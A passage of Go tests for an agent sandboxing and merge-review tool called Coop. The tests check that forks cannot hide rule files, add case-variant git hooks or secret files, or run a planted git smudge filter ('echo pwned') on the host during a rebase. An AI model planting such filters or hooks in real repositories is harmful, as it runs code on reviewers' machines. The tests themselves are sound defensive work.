		{"a link", ".coopignore", func(path string) error { return os.Symlink("elsewhere", path) }},
		{"a folder", ".coopignore/rules", func(path string) error { return os.WriteFile(filepath.Join(path, "rules"), []byte("x\n"), 0o644) }},
	} {
		t.Run(tc.name, func(t *testing.T) {
			repo := initRepo(t)
			writeTaskFile(t, filepath.Join(repo, ".coopignore"), "secrets/\n")
			git(t, repo, "add", ".coopignore")
			git(t, repo, "commit", "-qm", "rules")
			git(t, repo, "checkout", "-q", "-b", "candidate")
			path := filepath.Join(repo, ".coopignore")
			if err := os.Remove(path); err != nil {
				t.Fatal(err)
			}
			if tc.name == "a folder" {
				if err := os.Mkdir(path, 0o755); err != nil {
					t.Fatal(err)
				}
			}
			if err := tc.replace(path); err != nil {
				t.Fatal(err)
			}
			git(t, repo, "add", "-A")
			git(t, repo, "commit", "-qm", "move the rules away")
			git(t, repo, "checkout", "-q", "main")
			want := tc.flagged + " — the fork makes a .coopignore something other than a regular file, which Coop cannot read"
			if got := mustPolicyScan(t, repo, "candidate"); !slices.Contains(got, want) {
				t.Fatalf("PolicyScan = %q; want %q", got, want)
			}
		})
	}
}

// A folder named .COOPIGNORE is what a case-insensitive Mac disk opens as the folder's .coopignore,
// so a fork that adds one is named like any other rules file Coop cannot read.
func TestPolicyScanFlagsARulesFolderInAnotherCase(t *testing.T) {
	repo := initRepo(t)
	git(t, repo, "checkout", "-q", "-b", "candidate")
	writeTaskFile(t, filepath.Join(repo, "web", ".COOPIGNORE", "rules"), "x\n")
	git(t, repo, "add", "-A")
	git(t, repo, "commit", "-qm", "a rules folder")
	git(t, repo, "checkout", "-q", "main")
	want := "web/.COOPIGNORE/rules — the fork makes a .coopignore something other than a regular file, which Coop cannot read"
	if got := mustPolicyScan(t, repo, "candidate"); !slices.Contains(got, want) {
		t.Fatalf("PolicyScan = %q; want %q", got, want)
	}
}

// Another spelling of a host-run file or a secret name is that file once a Mac checks the fork out,
// so the scan judges every spelling, on every disk.
func TestPolicyScanJudgesEverySpelling(t *testing.T) {
	repo := initRepo(t)
	writeTaskFile(t, filepath.Join(repo, ".coopignore"), "private.yml\n")
	git(t, repo, "add", ".coopignore")
	git(t, repo, "commit", "-qm", "a project rule")
	git(t, repo, "checkout", "-q", "-b", "candidate")
	writeTaskFile(t, filepath.Join(repo, ".GITHOOKS", "pre-commit"), "#!/bin/sh\n")
	writeTaskFile(t, filepath.Join(repo, "config", "PRIVATE.yml"), "password: inert\n")
	git(t, repo, "add", "-A")
	git(t, repo, "commit", "-qm", "other spellings")
	git(t, repo, "checkout", "-q", "main")
	got := mustPolicyScan(t, repo, "candidate")
	for _, want := range []string{".GITHOOKS/pre-commit — Runs during Git operations.", "secret-like file: config/PRIVATE.yml"} {
		if !slices.Contains(got, want) {
			t.Errorf("PolicyScan = %q; want %q", got, want)
		}
	}
}

// A fork's in-tree .gitattributes + a fork-local smudge filter must not run on the land rebase's
// checkout. Includes a positive control (a raw re-checkout fires the smudge) so a green test means
// the neutralizer worked, not that the filter is dead.
func TestMergeNeutralizesForkDrivers(t *testing.T) {
	if _, err := exec.LookPath("git"); err != nil {
		t.Skip("git not available")
	}
	repo := initRepo(t)
	c := &Control{cfg: &config.Config{}}
	ws, err := forkspace.Setup(repo, "drv")
	if err != nil {
		t.Fatalf("forkspace.Setup: %v", err)
	}
	marker := filepath.Join(t.TempDir(), "PWNED")
	smudge := "sh -c 'echo pwned >> " + marker + "; cat'"
	if err := os.WriteFile(filepath.Join(ws, ".gitattributes"), []byte("data.txt filter=x\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(ws, "data.txt"), []byte("hi\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	git(t, ws, "config", "filter.x.smudge", smudge)
	git(t, ws, "config", "filter.x.clean", "cat")
	git(t, ws, "add", "-A")
	git(t, ws, "commit", "-qm", "work")
	// Advance the parent so landing must rebase (a checkout) rather than fast-forward.
	if err := os.WriteFile(filepath.Join(repo, "other.txt"), []byte("p\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	git(t, repo, "add", "-A")
	git(t, repo, "commit", "-qm", "parent moves")

	// Positive control: a raw re-checkout of data.txt fires the smudge — the trap is live.
	_ = os.Remove(filepath.Join(ws, "data.txt"))
	_ = exec.Command("git", "-C", ws, "checkout", "--", "data.txt").Run()
	if !pathExists(marker) {
		t.Skip("the smudge filter did not fire on this git version — can't prove the neutralizer here")
	}
	_ = os.Remove(marker)

	// The land rebase must NOT fire it. A .gitattributes change is a host surface (the reviewer's
	// own git would run the filter), so the merge refuses it until forced.
	if _, err := c.mergeOne(repo, "", "drv", false); err == nil || !strings.Contains(err.Error(), ".gitattributes") {
		t.Fatalf("mergeOne without --force = %v; want a refusal naming .gitattributes", err)
	}
	landed, err := mergeOneForTest(t, c, repo, "", "drv", true)
	if err != nil || !landed {
		t.Fatalf("mergeOne = (%v, %v), want landed", landed, err)
	}
	if pathExists(marker) {
		t.Fatal("the fork's smudge filter executed on the host during the land rebase")
	}
}

// openConfig is cfg with COOP_EGRESS=open. These gates use the ordinary image an open project
// runs; under the filtered default a gate uses the separately approved filtered image instead.
func openConfig(cfg *config.Config) *config.Config {
	cfg.SetEgress("open")
	return cfg
}

// `image inspect` fails the same way for a missing image and a dead daemon, and a build would not
// help a merge gate blocked by a stopped runtime. Name the daemon instead.
func TestMergeGateBlamesTheDaemonNotTheImage(t *testing.T) {
	t.Setenv("XDG_STATE_HOME", t.TempDir())
	for _, tc := range []struct {
		name     string
		infoExit string
		want     string
	}{
		{"daemon unreachable", "1", "Docker is unavailable"},
		{"daemon up, image absent", "0", "isn't built"},
	} {
		t.Run(tc.name, func(t *testing.T) {
			// Named "docker": EnsureDaemon probes only the Docker kind, which it reads off the binary.
			shim := filepath.Join(t.TempDir(), "docker")
			script := "#!/bin/sh\n" +
				"case \"$1\" in info) exit " + tc.infoExit + " ;; esac\n" +
				"case \"$1$2\" in imageinspect) exit 1 ;; esac\n" +
				"exit 0\n"
			if err := os.WriteFile(shim, []byte(script), 0o755); err != nil {
				t.Fatal(err)
			}
			c := &Control{
				cfg: openConfig(&config.Config{Gate: []string{"true"}, BaseImage: "coop-box"}),
				rt:  runtime.Runtime{Name: shim},
			}
			_, err := c.MergeGate(t.TempDir())
			if err == nil {
				t.Fatal("MergeGate succeeded with no image; want an error")
			}
			if !strings.Contains(err.Error(), tc.want) {
				t.Errorf("MergeGate = %q, want it to mention %q", err, tc.want)
			}
		})
	}
}

// After an upgrade, Coop's own base has a new tag the gate needs: the host builds it, as a launch
// does, instead of the merge demanding a manual build. Another image is not Coop's to build.
func TestMergeGateBuildsCoopsBaseAfterAnUpgrade(t *testing.T) {
	t.Setenv("XDG_STATE_HOME", t.TempDir())
	built := filepath.Join(t.TempDir(), "built")
	shim := filepath.Join(t.TempDir(), "docker")
	script := "#!/bin/sh\n" +
		"case \"$1$2\" in imageinspect) [ -f " + built + " ] && exit 0; exit 1 ;; esac\n" +
		"exit 0\n"
	if err := os.WriteFile(shim, []byte(script), 0o755); err != nil {
		t.Fatal(err)
	}
	calls := 0
	host := Host{EnsureBaseImage: func(io.Writer) error { calls++; return os.WriteFile(built, nil, 0o644) }}
	base := "coop-box:0123456789abcdef0123456789abcdef"
	c := New(openConfig(&config.Config{Gate: []string{"true"}, BaseImage: base}), runtime.Runtime{Name: shim}, host)
	if img, err := c.MergeGate(t.TempDir()); err != nil || img != base || calls != 1 {
		t.Fatalf("MergeGate = %q, %v after %d base builds; want Coop's base, built once", img, err, calls)
	}
	operator := New(openConfig(&config.Config{Gate: []string{"true"}, BaseImage: base, ImageOverride: "mine:1"}), runtime.Runtime{Name: shim}, host)
	if _, err := operator.MergeGate(t.TempDir()); calls != 1 {
		t.Fatalf("an operator's image made the host build Coop's base (%v)", err)
	}
}

// A controller review selects the worker image, never the source repository's Dockerfile tag.
func TestJobReviewGateRunsInTheJobImage(t *testing.T) {
	t.Setenv("XDG_STATE_HOME", t.TempDir())
	repo := filepath.Join(t.TempDir(), "repository")
	if err := os.MkdirAll(filepath.Join(repo, ".agent"), 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(repo, ".agent", "Dockerfile"), []byte("ARG COOP_BASE_IMAGE\nFROM ${COOP_BASE_IMAGE}\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	shim := filepath.Join(t.TempDir(), "docker")
	script := "#!/bin/sh\n" +
		"case \"$1$2$3\" in imageinspectworker-box|imageinspectoperator:1) exit 0 ;; imageinspect*) exit 1 ;; esac\n" +
		"exit 0\n"
	if err := os.WriteFile(shim, []byte(script), 0o755); err != nil {
		t.Fatal(err)
	}
	cfg := openConfig(&config.Config{Gate: []string{"true"}, BaseImage: "worker-box"})
	c := New(cfg, runtime.Runtime{Name: shim}, Host{})
	request := sessionsvc.ReviewGateRequest{Repository: repo, Candidate: t.TempDir(), NetworkMode: "none",
		Command: []string{"true"}, Resources: workerproto.JobResources{CPUMillis: 1000, MemoryBytes: 1 << 30, PIDs: 256}}
	if run, err := c.ReviewControllerJob(context.Background(), request); !run.Configured || err == nil || !strings.Contains(err.Error(), "review base") {
		t.Fatalf("job review = configured %v, error %v; want past image selection", run.Configured, err)
	}
	if _, err := c.MergeGate(repo); err == nil || !strings.Contains(err.Error(), "isn't built") {
		t.Fatalf("MergeGate = %v; want it to keep resolving the repository's own image", err)
	}
	cfg.ImageOverride = "operator:1"
	if run, err := c.ReviewControllerJob(context.Background(), request); !run.Configured || err == nil || !strings.Contains(err.Error(), "review base") {
		t.Fatalf("operator job review = configured %v, error %v; want past image selection", run.Configured, err)
	}
}

func TestControllerJobReviewIgnoresProjectAndAmbientLaunchSettings(t *testing.T) {
	t.Setenv("XDG_CONFIG_HOME", t.TempDir())
	t.Setenv("XDG_STATE_HOME", t.TempDir())
	t.Setenv("COOP_GATE", "false")
	t.Setenv("COOP_EGRESS", "open")
	t.Setenv("COOP_RUN_ARGS", "-e LEAK_FROM_DAEMON=1")
	t.Setenv("TZ", "Europe/Kyiv")
	t.Setenv("CI", "ambient-wrong")
	t.Setenv("DATABASE_URL", "ambient-wrong")
	t.Setenv("SHARED", "ambient-wrong")
	t.Setenv("SPECIAL_VALUE", "ambient-wrong")
	repo := initRepo(t)
	if err := os.MkdirAll(filepath.Join(repo, ".agent"), 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(repo, project.File), []byte("box: [newer settings]\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	git(t, repo, "add", ".agent/project.yaml")
	git(t, repo, "commit", "-qm", "unusable local project settings")
	state := filepath.Join(t.TempDir(), "sessions")
	staging := filepath.Join(state, "review-candidates", ".staging")
	if err := os.MkdirAll(staging, 0o700); err != nil {
		t.Fatal(err)
	}
	candidate := filepath.Join(staging, "review-one-123456")
	git(t, repo, "clone", "-q", "--", repo, candidate)
	git(t, candidate, "update-ref", "refs/coop/session-parent", "HEAD")
	runtimePath := filepath.Join(t.TempDir(), "docker")
	argsPath := filepath.Join(t.TempDir(), "args")
	shim := `#!/bin/sh
case "$1" in
run)
  printf '%s\n' "$@" > "$COOP_TEST_ARGS"
  previous=
  last=
  for arg do
    if [ "$previous" = "-e" ]; then export "$arg"; fi
    previous="$arg"
    last="$arg"
  done
  sh -c "$last"
  exit $?
  ;;
esac
exit 0
`
	if err := os.WriteFile(runtimePath, []byte(shim), 0o755); err != nil {
		t.Fatal(err)
	}
	t.Setenv("COOP_TEST_ARGS", argsPath)
	cfg, err := config.Load()
	if err != nil {
		t.Fatal(err)
	}
	if err := os.MkdirAll(cfg.ConfigDir, 0o700); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(cfg.EnvFile(), []byte("HOST_ENV_CANARY=1\n"), 0o600); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(cfg.MCPFile, []byte("{invalid shared MCP"), 0o600); err != nil {
		t.Fatal(err)
	}
	cfg.BaseImage = "worker-box"
	fc := New(cfg, runtime.Runtime{Name: runtimePath}, Host{})
	run, err := fc.ReviewControllerJob(context.Background(), sessionsvc.ReviewGateRequest{
		Repository: repo, Candidate: candidate, StateRoot: state, OperationID: "review-one", NetworkMode: "none",
		Command: []string{"sh", "-c", `test "$CI" = '1' && test "$DATABASE_URL" = 'postgres://test-db/app' && test "$SHARED" = 'review' && test "$SPECIAL_VALUE" = 'dollar$"=value'`},
		Environment: map[string]string{
			"CI": "1", "DATABASE_URL": "postgres://test-db/app", "JOB_SETTING": "yes", "SHARED": "review", "SPECIAL_VALUE": `dollar$"=value`, "TZ": "UTC"},
		Resources: workerproto.JobResources{CPUMillis: 1500, MemoryBytes: 1 << 30, PIDs: 256},
	})
	if err != nil || !run.Configured || !run.Passed() {
		t.Fatalf("controller job review = %+v error %v", run, err)
	}
	args, err := os.ReadFile(argsPath)
	if err != nil {
		t.Fatal(err)
	}
	if !strings.Contains(string(args), "--network\nnone\n") || !strings.Contains(string(args), box.LabelExecution+"=") ||
		strings.Contains(string(args), "LEAK_FROM_DAEMON") || strings.Contains(string(args), "HOST_ENV_CANARY") ||
		strings.Contains(string(args), "--env-file") || strings.Contains(string(args), "newer settings") ||
		!strings.Contains(string(args), "JOB_SETTING=yes") ||
		!strings.Contains(string(args), "CI=1") ||
		!strings.Contains(string(args), "DATABASE_URL=postgres://test-db/app") ||
		!strings.Contains(string(args), "\nsh\n-c\n") || strings.Contains(string(args), "\nfalse\n") ||
		strings.LastIndex(string(args), "TZ=UTC") <= strings.LastIndex(string(args), "TZ=Europe/Kyiv") ||
		!strings.Contains(string(args), "--cpus\n1.500\n") ||
		!strings.Contains(string(args), "--memory\n1073741824\n") || !strings.Contains(string(args), "--pids-limit\n256\n") {
		t.Fatalf("job review inherited host/project settings:\n%s", args)
	}
}

// Different jobs can review on one daemon at once. The saved mode belongs to each launch,
// including an open review when the daemon's own setting is offline.
func TestControllerJobReviewsKeepEachSavedNetworkMode(t *testing.T) {
	t.Setenv("XDG_CONFIG_HOME", t.TempDir())
	t.Setenv("XDG_STATE_HOME", t.TempDir())
	t.Setenv("COOP_GATE", "true")
	t.Setenv("COOP_EGRESS", "offline")
	repo := initRepo(t)
	if err := os.MkdirAll(filepath.Join(repo, ".agent"), 0o755); err != nil {
		t.Fatal(err)
	}
	for name, content := range map[string]string{
		"project.yaml": "box: [invalid local settings]\n",
		"Dockerfile":   "FROM unavailable:latest\n",
	} {
		if err := os.WriteFile(filepath.Join(repo, ".agent", name), []byte(content), 0o644); err != nil {
			t.Fatal(err)
		}
	}
	git(t, repo, "add", ".agent")
	git(t, repo, "commit", "-qm", "unusable project policy")
	state := filepath.Join(t.TempDir(), "sessions")
	staging := filepath.Join(state, "review-candidates", ".staging")
	if err := os.MkdirAll(staging, 0o700); err != nil {
		t.Fatal(err)
	}
	request := func(id, mode string) sessionsvc.ReviewGateRequest {
		t.Helper()
		candidate := filepath.Join(staging, id+"-123456")
		git(t, repo, "clone", "-q", "--", repo, candidate)
		git(t, candidate, "update-ref", "refs/coop/session-parent", "HEAD")
		resources := workerproto.JobResources{CPUMillis: 1000, MemoryBytes: 1 << 30, PIDs: 128}
		if mode == "none" {
			resources = workerproto.JobResources{CPUMillis: 1500, MemoryBytes: 2 << 30, PIDs: 256}
		}
		return sessionsvc.ReviewGateRequest{Repository: repo, Candidate: candidate, StateRoot: state,
			OperationID: id, NetworkMode: mode, Command: []string{"true"},
			Environment: map[string]string{"JOB_ID": id},
			Resources:   resources}
	}
	shim := filepath.Join(t.TempDir(), "docker")
	if err := os.WriteFile(shim, []byte("#!/bin/sh\ncase \"$1\" in\nrun) printf '%s\\n' \"$@\" ;;\nesac\nexit 0\n"), 0o755); err != nil {
		t.Fatal(err)
	}
	cfg, err := config.Load()
	if err != nil {
		t.Fatal(err)
	}
	cfg.BaseImage = "worker-box"
	fc := New(cfg, runtime.Runtime{Name: shim}, Host{})
	check := func(req sessionsvc.ReviewGateRequest) error {
		var output bytes.Buffer
		req.Output = &output
		run, err := fc.ReviewControllerJob(context.Background(), req)
		if err != nil || !run.Passed() {
			return fmt.Errorf("%s review = %+v, %v", req.NetworkMode, run, err)
		}
		offline := strings.Contains(output.String(), "--network\nnone\n")
		if offline != (req.NetworkMode == "none") || (req.NetworkMode == "open" && strings.Contains(output.String(), "--network\n")) {
			return fmt.Errorf("%s review runtime args:\n%s", req.NetworkMode, &output)
		}
		if !strings.Contains(output.String(), "JOB_ID="+req.OperationID+"\n") ||
			strings.Count(output.String(), "JOB_ID=") != 1 ||
			!strings.Contains(output.String(), fmt.Sprintf("--cpus\n%.3f\n", float64(req.Resources.CPUMillis)/1000)) ||
			!strings.Contains(output.String(), fmt.Sprintf("--memory\n%d\n", req.Resources.MemoryBytes)) ||
			!strings.Contains(output.String(), fmt.Sprintf("--pids-limit\n%d\n", req.Resources.PIDs)) {
			return fmt.Errorf("%s review leaked another job's setup:\n%s", req.OperationID, &output)
		}
		return nil
	}
	for _, mode := range []string{"open", "none"} {
		if err := check(request("sequential-"+mode, mode)); err != nil {
			t.Fatal(err)
		}
	}
	requests := []sessionsvc.ReviewGateRequest{request("parallel-open", "open"), request("parallel-none", "none")}
	results := make(chan error, len(requests))
	for _, req := range requests {
		go func() { results <- check(req) }()
	}
	for range requests {
		if err := <-results; err != nil {
			t.Error(err)
		}
	}
	if cfg.Egress != "none" || !cfg.Explicit("COOP_EGRESS") {
		t.Fatalf("reviews changed daemon egress: %q, explicit=%t", cfg.Egress, cfg.Explicit("COOP_EGRESS"))
	}
}

// A filtered review reopens the accepted job snapshot. A missing host qualification refuses it
// after that exact lookup; neither the repository's project policy nor a fresh grant is used.
func TestControllerJobFilteredReviewUsesTheSavedSnapshot(t *testing.T) {
	t.Setenv("XDG_CONFIG_HOME", t.TempDir())
	t.Setenv("XDG_STATE_HOME", t.TempDir())
	t.Setenv("COOP_GATE", "true")
	repo := initRepo(t)
	if err := os.MkdirAll(filepath.Join(repo, ".agent"), 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(repo, ".agent", "project.yaml"), []byte("box: [invalid local settings]\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(repo, ".agent", "Dockerfile"), []byte("FROM unavailable:latest\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	state := filepath.Join(t.TempDir(), "sessions")
	staging := filepath.Join(state, "review-candidates", ".staging")
	if err := os.MkdirAll(staging, 0o700); err != nil {
		t.Fatal(err)
	}
	candidate := filepath.Join(staging, "filtered-review-123456")
	git(t, repo, "clone", "-q", "--", repo, candidate)
	git(t, candidate, "update-ref", "refs/coop/session-parent", "HEAD")
	root, err := box.NetworkStatePath()
	if err != nil {
		t.Fatal(err)
	}
	store, err := networkstate.Open(root, nil)
	if err != nil {
		t.Fatal(err)
	}
	ref := networkstate.JobSnapshotRef{JobDigest: strings.Repeat("a", 64), SessionID: "remote_one"}
	snapshot, err := store.CaptureJob(ref, []egress.Rule{{To: egress.Destination{Domain: "job.example.com"}, Protocol: "tls", Ports: []int{443}}}, nil, false)
	if err != nil {
		t.Fatal(err)
	}
	if err := store.Close(); err != nil {
		t.Fatal(err)
	}
	cfg, err := config.Load()
	if err != nil {
		t.Fatal(err)
	}
	cfg.BaseImage = "worker-box"
	fc := New(cfg, runtime.Runtime{Name: "docker"}, Host{})
	request := sessionsvc.ReviewGateRequest{Repository: repo, Candidate: candidate, StateRoot: state,
		OperationID: "filtered-review", NetworkMode: "filtered", SessionID: ref.SessionID,
		JobDigest: ref.JobDigest, NetworkFingerprint: snapshot.Fingerprint, NetworkQualification: strings.Repeat("b", 64),
		Command: []string{"true"}, Resources: workerproto.JobResources{CPUMillis: 1000, MemoryBytes: 1 << 30, PIDs: 256}}
	if _, err := fc.ReviewControllerJob(context.Background(), request); err == nil || !strings.Contains(err.Error(), "no longer set up") {
		t.Fatalf("matching job snapshot did not reach qualification: %v", err)
	}
	request.NetworkFingerprint = strings.Repeat("c", 64)
	if _, err := fc.ReviewControllerJob(context.Background(), request); err == nil || !strings.Contains(err.Error(), "not on this host") {
		t.Fatalf("wrong job fingerprint was not refused: %v", err)
	}
}

// A red review said only "gate failed" while what the checks printed went to the worker's own log
// (emisar, 2026-09-28). The controller job's gate prints into the review's output instead, both
// streams, and says which command ran and how it exited.
func TestControllerJobReviewPrintsIntoTheReviewAndReportsItsExit(t *testing.T) {
	t.Setenv("XDG_CONFIG_HOME", t.TempDir())
	t.Setenv("XDG_STATE_HOME", t.TempDir())
	t.Setenv("COOP_GATE", "./run gate")
	repo := initRepo(t)
	state := filepath.Join(t.TempDir(), "sessions")
	staging := filepath.Join(state, "review-candidates", ".staging")
	if err := os.MkdirAll(staging, 0o700); err != nil {
		t.Fatal(err)
	}
	candidate := filepath.Join(staging, "review-red-123456")
	git(t, repo, "clone", "-q", "--", repo, candidate)
	git(t, candidate, "update-ref", "refs/coop/session-parent", "HEAD")
	runtimePath := filepath.Join(t.TempDir(), "docker")
	script := "#!/bin/sh\ncase \"$1\" in\nrun) echo '1 test, 1 failure'; echo 'warning: unused' >&2; exit 3 ;;\nesac\nexit 0\n"
	if err := os.WriteFile(runtimePath, []byte(script), 0o755); err != nil {
		t.Fatal(err)
	}
	cfg, err := config.Load()
	if err != nil {
		t.Fatal(err)
	}
	cfg.BaseImage = "worker-box"
	var output bytes.Buffer
	fc := New(cfg, runtime.Runtime{Name: runtimePath}, Host{})
	run, err := fc.ReviewControllerJob(context.Background(), sessionsvc.ReviewGateRequest{
		Repository: repo, Candidate: candidate, StateRoot: state, OperationID: "review-red", NetworkMode: "none",
		Output: &output, Command: []string{"./run", "gate"},
		Resources: workerproto.JobResources{CPUMillis: 1000, MemoryBytes: 1 << 30, PIDs: 256},
	})
	if err != nil || !run.Configured || run.Passed() || run.ExitCode == nil || *run.ExitCode != 3 ||
		strings.Join(run.Command, " ") != "./run gate" {
		t.Fatalf("red controller job review = %+v, error %v", run, err)
	}
	if !strings.Contains(output.String(), "1 test, 1 failure\n") || !strings.Contains(output.String(), "warning: unused\n") {
		t.Fatalf("the review kept %q of the gate's output", output.String())
	}
}

func TestFilteredMergeGateDoesNotRequireAnOrdinaryImage(t *testing.T) {
	t.Setenv("XDG_STATE_HOME", t.TempDir())
	repo := initRepo(t)
	if err := os.MkdirAll(filepath.Join(repo, ".agent"), 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(repo, project.File), []byte("box:\n  egress: filtered\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(repo, ".agent", "Dockerfile"), []byte("ARG COOP_BASE_IMAGE\nFROM ${COOP_BASE_IMAGE}\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	marker := filepath.Join(t.TempDir(), "runtime-called")
	shim := filepath.Join(t.TempDir(), "docker")
	if err := os.WriteFile(shim, []byte("#!/bin/sh\ntouch '"+marker+"'\nexit 1\n"), 0o755); err != nil {
		t.Fatal(err)
	}
	cfg := &config.Config{Gate: []string{"true"}, BaseImage: "coop-box"}
	c := New(cfg, runtime.Runtime{Name: shim}, Host{EnsureBaseImage: func(io.Writer) error {
		t.Fatal("filtered gate tried to build the ordinary base")
		return nil
	}})
	if img, err := c.MergeGate(repo); err != nil || img != box.ImageForRepo(repo, cfg.BaseImage, "") {
		t.Fatalf("filtered gate required the unused ordinary image: %q / %v", img, err)
	}
	if _, err := os.Stat(marker); !os.IsNotExist(err) {
		t.Fatalf("filtered gate inspected or built an ordinary image: %v", err)
	}
}

// A red merge gate restores the reviewed candidate; the fix then lands as commits on top of it.
// Retiring the stale candidate returns its owners to reviewing so the next signoff republishes
// the new HEAD and the merge lands the fixed fork — while a HEAD that does not descend from the
// candidate still fails closed.
func TestTaskCandidateCanBeFixedAndRemergedAfterARedGate(t *testing.T) {
	repo, ws, root, identity, c := prepareForkTaskCandidate(t, "task-red-gate-fix")
	candidate, ok, err := tasks.ReadForkCandidate(repo, identity)
	if err != nil || !ok {
		t.Fatalf("read candidate: ok=%v err=%v", ok, err)
	}
	c.gateOK = func(_, _, _ string) bool { return false }
	if landed, err := mergeOneForTest(t, c, repo, "gate-img", identity.Name, false); landed || err == nil || !strings.Contains(err.Error(), "candidate restored") {
		t.Fatalf("red-gate merge = (%v, %v)", landed, err)
	}
	if transition, err := tasks.SupersedeStaleForkCandidate(repo, identity, forkspace.GitOut(ws, "rev-parse", "HEAD")); transition.Started || err != nil {
		t.Fatalf("retire at the candidate's own HEAD = (%+v, %v); want nothing to retire", transition, err)
	}

	// History rewritten under the candidate: not a descendant, so the candidate stays.
	git(t, ws, "commit", "-q", "--amend", "-m", "rewritten candidate\n\nCoop-Task: canonical-task")
	rewritten := forkspace.GitOut(ws, "rev-parse", "HEAD")
	if transition, err := tasks.SupersedeStaleForkCandidate(repo, identity, rewritten); transition.Started || err == nil || !strings.Contains(err.Error(), "no longer descends") {
		t.Fatalf("retire on rewritten history = (%+v, %v); want a fail-closed refusal", transition, err)
	}
	if _, ok, err := tasks.ReadForkCandidate(repo, identity); err != nil || !ok {
		t.Fatalf("candidate lost on a refused retirement: ok=%v err=%v", ok, err)
	}
	git(t, ws, "reset", "-q", "--hard", candidate.Head)

	// The real fix: commits on top of the reviewed candidate.
	if err := os.WriteFile(filepath.Join(ws, "fix.txt"), []byte("gate fixed\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	git(t, ws, "add", "fix.txt")
	git(t, ws, "commit", "-qm", "fix the gate\n\nCoop-Task: canonical-task")
	fixedHead, fixedTree := forkspace.GitOut(ws, "rev-parse", "HEAD"), forkspace.GitOut(ws, "rev-parse", "HEAD^{tree}")
	if transition, err := tasks.SupersedeStaleForkCandidate(repo, identity, fixedHead); !transition.Started || err != nil {
		t.Fatalf("retire after the fix = (%+v, %v); want the stale candidate retired", transition, err)
	}
	if _, ok, err := tasks.ReadForkCandidate(repo, identity); err != nil || ok {
		t.Fatalf("stale candidate survives: ok=%v err=%v", ok, err)
	}
	record, owned, err := tasks.ReadTaskOwnerRecord(root, "canonical-task")
	if err != nil || !owned || record.Fork == nil || record.Fork.Phase != tasks.ForkAssignmentReviewing || record.Fork.CandidateID != "" {
		t.Fatalf("owner after retirement = %+v, owned=%v err=%v; want reviewing with no candidate", record.Fork, owned, err)
	}
	// Retiring again is a no-op: nothing is published, nothing changes.
	if transition, err := tasks.SupersedeStaleForkCandidate(repo, identity, fixedHead); transition.Started || err != nil {
		t.Fatalf("second retirement = (%+v, %v)", transition, err)
	}

	// The next exact candidate-wide signoff authorizes round two, and a green gate lands it.
	review, exists, err := tasks.BeginForkCandidateReview(repo, identity, fixedHead, fixedTree)
	if err != nil || !exists || !review.Required || review.Round != 2 || review.PreviousRound != 1 {
		t.Fatalf("begin fixed review = %+v, exists=%v err=%v", review, exists, err)
	}
	if err := tasks.AuthorizeForkCandidateReview(repo, identity, review.Candidate.ID); err != nil {
		t.Fatalf("authorize fixed review: %v", err)
	}
	if _, published, err := tasks.PublishForkCandidate(repo, identity, fixedHead, fixedTree); err != nil || !published {
		t.Fatalf("republish after the fix: published=%v err=%v", published, err)
	}
	c.gateOK = func(_, _, _ string) bool { return true }
	if landed, err := mergeOneForTest(t, c, repo, "gate-img", identity.Name, false); !landed || err != nil {
		t.Fatalf("merge after the fix = (%v, %v)", landed, err)
	}
	if data, err := os.ReadFile(filepath.Join(repo, "fix.txt")); err != nil || string(data) != "gate fixed\n" {
		t.Fatalf("fix did not land: %q, %v", data, err)
	}
	if item, ok := mustCurrentTask(t, root, "canonical-task"); !ok || item.State != tasks.StateDone {
		t.Fatalf("canonical task after the fixed merge = %+v, ok=%v", item, ok)
	}
}

func TestForkMergeAllReplaysZeroAheadLandBookkeeping(t *testing.T) {
	repo, ws, root, identity, c := prepareForkTaskCandidate(t, "zero-ahead-replay")
	c.afterLandFastForward = func() error { return errors.New("injected crash after fast-forward") }
	result, err := c.mergeOne(repo, "", identity.Name, false)
	result.approval.close()
	if err == nil || !result.landed {
		t.Fatalf("injected land interruption = %+v, %v", result, err)
	}
	if forkspace.GitOut(repo, "rev-list", "--count", "HEAD..review/"+identity.Name) != "0" {
		t.Fatal("fixture is not zero commits ahead after the interrupted fast-forward")
	}
	if _, pending, err := readLandIntent(repo, identity); err != nil || !pending {
		t.Fatalf("land journal after interruption = %v, %v", pending, err)
	}
	c.afterLandFastForward = nil
	var lines []string
	ui.SetLiveSink(func(line string) { lines = append(lines, line) })
	t.Cleanup(func() { ui.SetLiveSink(nil) })
	code, err := c.forkMergeAll(repo, []string{identity.Name}, "", false, true)
	if err != nil || code != 0 {
		t.Fatalf("merge-all replay = %d, %v", code, err)
	}
	if item, ok := mustCurrentTask(t, root, "canonical-task"); !ok || item.State != tasks.StateDone {
		t.Fatalf("canonical task after replay = %+v, %v", item, ok)
	}
	if pathExists(ws) {
		t.Fatal("clean replayed fork was not removed")
	}
	if _, pending, err := readLandIntent(repo, identity); err != nil || pending {
		t.Fatalf("land journal after replay = %v, %v", pending, err)
	}
	output := strings.Join(lines, "\n")
	if !strings.Contains(output, "Finishing interrupted merge bookkeeping for "+identity.Name+".") {
		t.Fatalf("pending bookkeeping was not announced:\n%s", output)
	}
	if strings.Contains(output, "Skipped "+identity.Name+" — no new commits or pending landing.") {
		t.Fatalf("pending bookkeeping was reported as empty:\n%s", strings.Join(lines, "\n"))
	}
	if _, err := os.Stat(filepath.Join(forkspace.StateDir(repo), "candidate-history", identity.Name+"."+string(identity.Generation))); err != nil {
		t.Fatalf("candidate history was lost after cleanup: %v", err)
	}
}

func TestForkMergeAllFinalizesZeroAheadCandidate(t *testing.T) {
	repo, ws, root, identity, c := prepareForkTaskCandidate(t, "zero-ahead-candidate")
